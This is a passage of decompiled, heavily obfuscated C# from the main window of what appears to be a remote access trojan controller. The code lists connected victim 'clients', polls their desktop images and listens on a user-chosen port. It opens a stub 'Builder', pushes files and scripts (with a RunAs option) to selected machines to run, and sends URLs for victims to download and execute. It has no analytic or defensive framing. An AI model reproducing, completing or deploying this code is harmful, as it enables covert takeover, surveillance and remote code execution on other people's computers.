		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2002(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0002\u2003);
			if (this.\u0006\u2004 != null)
			{
				this.\u0006\u2004.Click -= value;
			}
			this.\u0006\u2004 = \u0002;
			if (this.\u0006\u2004 != null)
			{
				this.\u0006\u2004.Click += value;
			}
		}

		// Token: 0x060001DD RID: 477 RVA: 0x000187B4 File Offset: 0x000169B4
		private void \u0002(object \u0002, EventArgs \u0003)
		{
			this.isActive = true;
			this.Opacity = 1.0;
		}

		// Token: 0x060001DE RID: 478 RVA: 0x000187CC File Offset: 0x000169CC
		private void \u0003(object \u0002, EventArgs \u0003)
		{
			this.isActive = false;
			this.Opacity = 0.95;
		}

		// Token: 0x060001DF RID: 479 RVA: 0x000187E4 File Offset: 0x000169E4
		private void \u0002(object \u0002, FormClosingEventArgs \u0003)
		{
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Visible = false;
			try
			{
				global::\u000E\u2000.\u0008\u2002.Dispose();
			}
			catch (Exception ex)
			{
			}
			global::\u000E\u2000.\u0002.\u0003();
			ProjectData.EndApp();
		}

		// Token: 0x060001E0 RID: 480 RVA: 0x0001883C File Offset: 0x00016A3C
		public void dsk()
		{
			for (;;)
			{
				int num;
				switch (global::\u000E\u2000.\u0002.\u000E\u2000)
				{
				case 0:
					num = 10;
					break;
				case 1:
					num = 2000;
					break;
				case 2:
					num = 5000;
					break;
				case 3:
					num = 7500;
					break;
				default:
					num = 10000;
					break;
				}
				if (this.isActive & (ulong)global::\u0006\u2000.\u0002() < 12000UL & this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Columns[0].Width != 0)
				{
					foreach (DataGridViewRow dataGridViewRow in this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002())
					{
						if (dataGridViewRow != null)
						{
							Client client = (Client)dataGridViewRow.Tag;
							if (client != null)
							{
								bool flag = false;
								if (DateTime.Compare(client.lastPC, DateTime.MinValue) == 0)
								{
									flag = true;
								}
								else if (DateAndTime.Now.Subtract(client.lastPC).TotalMilliseconds >= (double)num)
								{
									flag = true;
								}
								if (!client.Isend && flag)
								{
									client.Isend = true;
									client.lastPC = DateAndTime.Now;
									client.Send(string.Concat(new string[]
									{
										global::\u0006\u2001.\u0002(-1829136402),
										global::\u000E\u2000.\u000E,
										Conversions.ToString(this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Columns[0].Width),
										global::\u000E\u2000.\u000E,
										Conversions.ToString(this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002())
									}));
								}
							}
						}
					}
				}
				Thread.Sleep(checked((int)Math.Round((double)num / 2.0)));
			}
		}

		// Token: 0x060001E1 RID: 481 RVA: 0x00018A10 File Offset: 0x00016C10
		private void \u0005(object \u0002, EventArgs \u0003)
		{
			checked
			{
				this.Left = 0 - this.Width + Screen.PrimaryScreen.WorkingArea.Width;
				this.Top = 0 - this.Height + Screen.PrimaryScreen.WorkingArea.Height;
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(global::\u0006\u2001.\u0002(-1829136412), global::\u0005\u2001.\u0006.StretchImage, DataGridViewAutoSizeColumnMode.None);
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(global::\u0006\u2001.\u0002(-1829136393), global::\u0005\u2001.\u0006.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(global::\u0006\u2001.\u0002(-1829136436), global::\u0005\u2001.\u0006.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(global::\u0006\u2001.\u0002(-1829136445), global::\u0005\u2001.\u0006.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(global::\u0006\u2001.\u0002(-1829136422), global::\u0005\u2001.\u0006.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(global::\u0006\u2001.\u0002(-1829136849), global::\u0005\u2001.\u0006.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(global::\u0006\u2001.\u0002(-1829136836), global::\u0005\u2001.\u0006.Image, DataGridViewAutoSizeColumnMode.AllCells);
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(global::\u0006\u2001.\u0002(-1829136847), global::\u0005\u2001.\u0006.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(global::\u0006\u2001.\u0002(-1829136893), global::\u0005\u2001.\u0006.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(global::\u0006\u2001.\u0002(-1829138778), global::\u0005\u2001.\u0006.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(global::\u0006\u2001.\u0002(-1829136788), global::\u0005\u2001.\u0006.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(global::\u0006\u2001.\u0002(-1829136798), global::\u0005\u2001.\u0006.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(global::\u0006\u2001.\u0002(-1829136777), global::\u0005\u2001.\u0006.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Columns[0].Width = 35;
				this.Show();
				global::\u000E\u2000.\u0002\u2002.Show();
				Control.CheckForIllegalCrossThreadCalls = false;
				global::\u000E\u2000.\u000F = this;
				this.Text = global::\u000E\u2000.\u0003;
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Text = global::\u000E\u2000.\u0003;
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Icon = this.Icon;
				this.ShowInTaskbar = true;
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0008\u2000\u200A\u2009\u2000\u2005\u0002().Enabled = true;
				foreach (string fileName in Directory.GetFiles(Application.StartupPath + global::\u0006\u2001.\u0002(-1829136829), global::\u0006\u2001.\u0002(-1829136812)))
				{
					\u000E\u2000.\u0003 item = new \u000E\u2000.\u0003(new FileInfo(fileName).Name.ToLower());
					global::\u000E\u2000.\u000F\u2001.Add(item);
				}
				foreach (string text in Strings.Split(global::\u0006\u2001.\u0002(-1829136728), global::\u0006\u2001.\u0002(-1829136748), -1, CompareMethod.Binary))
				{
					if (global::\u000E\u2000.\u0002(text, null) == null)
					{
						Interaction.MsgBox(global::\u0006\u2001.\u0002(-1829136660) + text, MsgBoxStyle.OkOnly, null);
						string left = Strings.Split(text, global::\u0006\u2001.\u0002(-1829136650), -1, CompareMethod.Binary)[0];
						if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829136690), false) == 0)
						{
							this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2000().Enabled = false;
						}
						else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829136700), false) == 0)
						{
							this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2000().Enabled = false;
						}
						else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829136677), false) == 0)
						{
							this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2001().Enabled = false;
						}
						else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829136687), false) == 0)
						{
							this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2000().Enabled = false;
						}
						else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829137112), false) == 0)
						{
							this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2000().Enabled = false;
						}
						else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829137090), false) == 0)
						{
							this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2001().Enabled = false;
						}
					}
				}
				try
				{
					global::\u000E\u2000.\u0008\u2002 = new WaveOut(0);
					global::\u000E\u2000.\u0008\u2002.Open(WaveFormat.Pcm8Khz8BitMono);
					global::\u000E\u2000.\u0006\u2002 = new WaveOut(0);
					global::\u000E\u2000.\u0006\u2002.Open(WaveFormat.Pcm44Khz16BitMono);
				}
				catch (Exception ex)
				{
					this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2001().Enabled = false;
				}
				global::\u000E\u2000.\u0002.\u0002();
				for (;;)
				{
					try
					{
						port port = new port();
						port.cl67n8rszrwxft8tprpptkthtl8wywjj\u200A\u2009\u2000\u2005\u0002().Text = global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829139948), global::\u0006\u2001.\u0002(-1829137100));
						port.ShowDialog(this);
						if (port.port < 1)
						{
							this.Close();
							return;
						}
						this.port = port.port;
						this.S = new SK(this.port);
						global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829139948), Conversions.ToString(this.port));
					}
					catch (Exception ex2)
					{
						Interaction.MsgBox(ex2.Message, MsgBoxStyle.OkOnly, null);
						continue;
					}
					break;
				}
				global::\u000E\u2000.\u0005 = this.S;
				Thread thread = new Thread(new ThreadStart(this.dsk), 1);
				thread.Start();
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Enabled = true;
			}
		}

		// Token: 0x060001E2 RID: 482 RVA: 0x00018F28 File Offset: 0x00017128
		private void \u0008(object \u0002, EventArgs \u0003)
		{
			if (Operators.ConditionalCompareObjectEqual(this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Tag, global::\u0006\u2001.\u0002(-1829137143), false))
			{
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Text = global::\u0006\u2001.\u0002(-1829139316);
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Tag = global::\u0006\u2001.\u0002(-1829139276);
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().BringToFront();
			}
			else
			{
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Text = global::\u0006\u2001.\u0002(-1829137151);
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Tag = global::\u0006\u2001.\u0002(-1829137143);
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().BringToFront();
			}
		}

		// Token: 0x060001E3 RID: 483 RVA: 0x00018FC4 File Offset: 0x000171C4
		private void \u0006(object \u0002, EventArgs \u0003)
		{
			try
			{
				foreach (object obj in this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						NewLateBinding.LateSetComplex(dataGridViewRow.Tag, null, global::\u0006\u2001.\u0002(-1829137135), new object[]
						{
							false
						}, null, null, false, true);
					}
					catch (Exception ex)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060001E4 RID: 484 RVA: 0x00019074 File Offset: 0x00017274
		private void \u000E(object \u0002, EventArgs \u0003)
		{
			Thread thread = new Thread(new ParameterizedThreadStart(global::\u000E\u2000.\u0002), 1);
			Thread thread2 = thread;
			object[] array = new object[2];
			object[] array2 = array;
			int num = 0;
			string text = global::\u0006\u2001.\u0002(-1829137048) + global::\u000E\u2000.\u000E + global::\u0006\u2001.\u0002(-1829139089);
			array2[num] = global::\u000E.\u0002(ref text);
			array[1] = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().DefaultCellStyle.ForeColor;
			thread2.Start(array);
		}

		// Token: 0x060001E5 RID: 485 RVA: 0x000190E4 File Offset: 0x000172E4
		private void \u000F(object \u0002, EventArgs \u0003)
		{
			Thread thread = new Thread(new ParameterizedThreadStart(global::\u000E\u2000.\u0002), 1);
			Thread thread2 = thread;
			object[] array = new object[2];
			object[] array2 = array;
			int num = 0;
			string text = global::\u0006\u2001.\u0002(-1829137048) + global::\u000E\u2000.\u000E + global::\u0006\u2001.\u0002(-1829138768);
			array2[num] = global::\u000E.\u0002(ref text);
			array[1] = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().DefaultCellStyle.ForeColor;
			thread2.Start(array);
		}

		// Token: 0x060001E6 RID: 486 RVA: 0x00019154 File Offset: 0x00017354
		private void \u0002\u2000(object \u0002, EventArgs \u0003)
		{
			Thread thread = new Thread(new ParameterizedThreadStart(global::\u000E\u2000.\u0002), 1);
			Thread thread2 = thread;
			object[] array = new object[2];
			object[] array2 = array;
			int num = 0;
			string text = global::\u0006\u2001.\u0002(-1829137048) + global::\u000E\u2000.\u000E + global::\u0006\u2001.\u0002(-1829138798);
			array2[num] = global::\u000E.\u0002(ref text);
			array[1] = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().DefaultCellStyle.ForeColor;
			thread2.Start(array);
		}

		// Token: 0x060001E7 RID: 487 RVA: 0x000191C4 File Offset: 0x000173C4
		private void \u0003\u2000(object \u0002, EventArgs \u0003)
		{
			if (this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows.Count == 0)
			{
				return;
			}
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = global::\u0006\u2001.\u0002(-1829140354);
			openFileDialog.FileName = string.Empty;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				byte[] u = File.ReadAllBytes(openFileDialog.FileName);
				bool flag = true;
				byte[] array = global::\u000E.\u0002(u, ref flag);
				MemoryStream memoryStream = new MemoryStream();
				string text = global::\u0006\u2001.\u0002(-1829137025) + global::\u000E\u2000.\u000E;
				memoryStream.Write(global::\u000E.\u0002(ref text), 0, text.Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(global::\u000E\u2000.\u0002), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray(),
					this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().DefaultCellStyle.ForeColor
				});
			}
		}

		// Token: 0x060001E8 RID: 488 RVA: 0x000192B0 File Offset: 0x000174B0
		private void \u0005\u2000(object \u0002, EventArgs \u0003)
		{
			if (this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows.Count == 0)
			{
				return;
			}
			string text = global::\u0006\u2001.\u0002(-1829137025) + global::\u000E\u2000.\u000E;
			string text2 = Interaction.InputBox(global::\u0006\u2001.\u0002(-1829137034), global::\u0006\u2001.\u0002(-1829137082), string.Empty, -1, -1);
			if (Operators.CompareString(text2, string.Empty, false) == 0)
			{
				return;
			}
			text += text2;
			Thread thread = new Thread(new ParameterizedThreadStart(global::\u000E\u2000.\u0002), 1);
			thread.Start(new object[]
			{
				text,
				Color.Green
			});
		}

		// Token: 0x060001E9 RID: 489 RVA: 0x00019358 File Offset: 0x00017558
		private void \u0008\u2000(object \u0002, EventArgs \u0003)
		{
			string text = Interaction.InputBox(global::\u0006\u2001.\u0002(-1829136977), global::\u0006\u2001.\u0002(-1829136966), string.Empty, -1, -1);
			if (text.Length > 0)
			{
				try
				{
					foreach (object obj in this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						try
						{
							NewLateBinding.LateCall(dataGridViewRow.Tag, null, global::\u0006\u2001.\u0002(-1829138710), new object[]
							{
								string.Concat(new string[]
								{
									global::\u0006\u2001.\u0002(-1829137018),
									global::\u000E\u2000.\u000E,
									global::\u0006\u2001.\u0002(-1829139089),
									global::\u000E\u2000.\u000E,
									global::\u0006\u2001.\u0002(-1829140463),
									global::\u000E\u2000.\u000E,
									global::\u000E.\u0002(ref text)
								})
							}, null, null, null, true);
							dataGridViewRow.Cells[global::\u000E\u2000.\u0002\u2000].Value = text + global::\u0006\u2001.\u0002(-1829136997) + Strings.Split(Conversions.ToString(dataGridViewRow.Cells[global::\u000E\u2000.\u0002\u2000].Value), global::\u0006\u2001.\u0002(-1829136997), -1, CompareMethod.Binary)[checked(Strings.Split(Conversions.ToString(dataGridViewRow.Cells[global::\u000E\u2000.\u0002\u2000].Value), global::\u0006\u2001.\u0002(-1829136997), -1, CompareMethod.Binary).Length - 1)];
						}
						catch (Exception ex)
						{
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x060001EA RID: 490 RVA: 0x00019530 File Offset: 0x00017730
		private void \u0006\u2000(object \u0002, EventArgs \u0003)
		{
			Builder builder = new Builder();
			builder.ShowDialog(this);
		}

		// Token: 0x060001EB RID: 491 RVA: 0x0001954C File Offset: 0x0001774C
		private void \u000E\u2000(object \u0002, EventArgs \u0003)
		{
			if (this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows.Count == 0)
			{
				return;
			}
			\u000E\u2000.\u0003 u = global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829137005), null);
			try
			{
				foreach (object obj in this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					global::\u000E\u2000.\u0002((Client)dataGridViewRow.Tag, u, false);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060001EC RID: 492 RVA: 0x000195EC File Offset: 0x000177EC
		private void \u000F\u2000(object \u0002, EventArgs \u0003)
		{
			if (this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows.Count == 0)
			{
				return;
			}
			\u000E\u2000.\u0003 u = global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829136923), null);
			try
			{
				foreach (object obj in this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					global::\u000E\u2000.\u0002((Client)dataGridViewRow.Tag, u, false);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060001ED RID: 493 RVA: 0x0001968C File Offset: 0x0001788C
		private void \u0002\u2001(object \u0002, EventArgs \u0003)
		{
			if (this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows.Count == 0)
			{
				return;
			}
			\u000E\u2000.\u0003 u = global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829136905), null);
			try
			{
				foreach (object obj in this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					global::\u000E\u2000.\u0002((Client)dataGridViewRow.Tag, u, true);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060001EE RID: 494 RVA: 0x0001972C File Offset: 0x0001792C
		private void \u0003\u2001(object \u0002, EventArgs \u0003)
		{
			try
			{
				foreach (object obj in this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					NewLateBinding.LateCall(dataGridViewRow.Tag, null, global::\u0006\u2001.\u0002(-1829138710), new object[]
					{
						global::\u0006\u2001.\u0002(-1829136950)
					}, null, null, null, true);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060001EF RID: 495 RVA: 0x000197C0 File Offset: 0x000179C0
		private void \u0005\u2001(object \u0002, EventArgs \u0003)
		{
			About about = new About();
			about.ShowDialog(this);
		}

		// Token: 0x060001F0 RID: 496 RVA: 0x000197DC File Offset: 0x000179DC
		private void \u0008\u2001(object \u0002, EventArgs \u0003)
		{
			if (this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows.Count == 0)
			{
				return;
			}
			\u000E\u2000.\u0003 u = global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829136959), null);
			try
			{
				foreach (object obj in this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					global::\u000E\u2000.\u0002((Client)dataGridViewRow.Tag, u, false);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060001F1 RID: 497 RVA: 0x0001987C File Offset: 0x00017A7C
		private void \u0006\u2001(object \u0002, EventArgs \u0003)
		{
			checked
			{
				try
				{
					this.\u000E\u2004++;
					if (this.\u000E\u2004 == 10)
					{
						this.\u000E\u2004 = 0;
						this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008().Text = global::\u0006\u2001.\u0002(-1829136940) + global::\u000E.\u0002(global::\u000E\u2000.\u0008) + global::\u0006\u2001.\u0002(-1829137371);
						this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006().Text = global::\u0006\u2001.\u0002(-1829137347) + global::\u000E.\u0002(global::\u000E\u2000.\u0006) + global::\u0006\u2001.\u0002(-1829137371);
						global::\u000E\u2000.\u0008 = 0L;
						global::\u000E\u2000.\u0006 = 0L;
					}
					this.Text = string.Concat(new string[]
					{
						global::\u000E\u2000.\u0003,
						global::\u0006\u2001.\u0002(-1829137396),
						Conversions.ToString(this.port),
						global::\u0006\u2001.\u0002(-1829137381),
						Conversions.ToString(this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().RowCount),
						global::\u0006\u2001.\u0002(-1829137306),
						Conversions.ToString(this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows.Count),
						global::\u0006\u2001.\u0002(-1829137296),
						Conversions.ToString(this.S.REQ.Count),
						global::\u0006\u2001.\u0002(-1829137371)
					});
					this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E().Text = global::\u0006\u2001.\u0002(-1829137341) + Conversions.ToString(this.S.Online.Count) + global::\u0006\u2001.\u0002(-1829137371);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x060001F2 RID: 498 RVA: 0x00019A30 File Offset: 0x00017C30
		private void \u000E\u2001(object \u0002, EventArgs \u0003)
		{
			try
			{
				if (!Directory.Exists(Conversions.ToString(NewLateBinding.LateGet(this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows[0].Tag, null, global::\u0006\u2001.\u0002(-1829137328), new object[0], null, null, null))))
				{
					Directory.CreateDirectory(Conversions.ToString(NewLateBinding.LateGet(this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows[0].Tag, null, global::\u0006\u2001.\u0002(-1829137328), new object[0], null, null, null)));
				}
				object instance = null;
				Type typeFromHandle = typeof(Process);
				string memberName = global::\u0006\u2001.\u0002(-1829138894);
				object[] array = new object[1];
				object[] array2 = array;
				int num = 0;
				object tag = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows[0].Tag;
				array2[num] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(tag, null, global::\u0006\u2001.\u0002(-1829137328), new object[0], null, null, null));
				object[] array3 = array;
				object[] arguments = array3;
				string[] argumentNames = null;
				Type[] typeArguments = null;
				bool[] array4 = new bool[]
				{
					true
				};
				NewLateBinding.LateCall(instance, typeFromHandle, memberName, arguments, argumentNames, typeArguments, array4, true);
				if (array4[0])
				{
					NewLateBinding.LateSetComplex(tag, null, global::\u0006\u2001.\u0002(-1829137328), new object[]
					{
						RuntimeHelpers.GetObjectValue(array3[0])
					}, null, null, true, true);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060001F3 RID: 499 RVA: 0x00019B8C File Offset: 0x00017D8C
		private void \u000F\u2001(object \u0002, EventArgs \u0003)
		{
			if (this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows.Count == 0)
			{
				return;
			}
			FURL furl = new FURL();
			furl.ShowDialog(this);
			if (furl.IsOK)
			{
				string text = string.Concat(new string[]
				{
					global::\u0006\u2001.\u0002(-1829137245),
					global::\u000E\u2000.\u000E,
					furl.ezla6gt96qe65p5lzwsfjbuh9jd56h8x\u200A\u2009\u2000\u2005\u0003().Text,
					global::\u000E\u2000.\u000E,
					furl.ezla6gt96qe65p5lzwsfjbuh9jd56h8x\u200A\u2009\u2000\u2005\u0002().Text
				});
				Thread thread = new Thread(new ParameterizedThreadStart(global::\u000E\u2000.\u0002), 1);
				thread.Start(new object[]
				{
					global::\u000E.\u0002(ref text),
					Color.Green
				});
			}
		}

		// Token: 0x060001F4 RID: 500 RVA: 0x00019C4C File Offset: 0x00017E4C
		private void \u0002\u2002(object \u0002, EventArgs \u0003)
		{
			if (this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows.Count == 0)
			{
				return;
			}
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.FileName = string.Empty;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				byte[] u = File.ReadAllBytes(openFileDialog.FileName);
				bool flag = true;
				byte[] array = global::\u000E.\u0002(u, ref flag);
				MemoryStream memoryStream = new MemoryStream();
				string text = global::\u0006\u2001.\u0002(-1829137245) + global::\u000E\u2000.\u000E + new FileInfo(openFileDialog.FileName).Extension.Remove(0, 1) + global::\u000E\u2000.\u000E;
				memoryStream.Write(global::\u000E.\u0002(ref text), 0, text.Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(global::\u000E\u2000.\u0002), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray(),
					this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().DefaultCellStyle.ForeColor
				});
			}
		}

		// Token: 0x060001F5 RID: 501 RVA: 0x00019D44 File Offset: 0x00017F44
		private void \u0003\u2002(object \u0002, EventArgs \u0003)
		{
			if (this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows.Count == 0)
			{
				return;
			}
			script script = new script();
			script.ShowDialog(this);
			if (script.Code.Length > 0)
			{
				byte[] u = global::\u000E.\u0002(ref script.Code);
				bool flag = true;
				byte[] array = global::\u000E.\u0002(u, ref flag);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = global::\u0006\u2001.\u0002(-1829137245) + global::\u000E\u2000.\u000E + script.RunAs + global::\u000E\u2000.\u000E;
				byte[] buffer = global::\u000E.\u0002(ref text);
				int offset = 0;
				string text2 = global::\u0006\u2001.\u0002(-1829137245) + global::\u000E\u2000.\u000E + script.RunAs + global::\u000E\u2000.\u000E;
				memoryStream2.Write(buffer, offset, global::\u000E.\u0002(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(global::\u000E\u2000.\u0002), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray(),
					this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().DefaultCellStyle.ForeColor
				});
			}
		}

		// Token: 0x060001F6 RID: 502 RVA: 0x00019E50 File Offset: 0x00018050
		private void \u0005\u2002(object \u0002, EventArgs \u0003)
		{
			if (this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows.Count == 0)
			{
				return;
			}
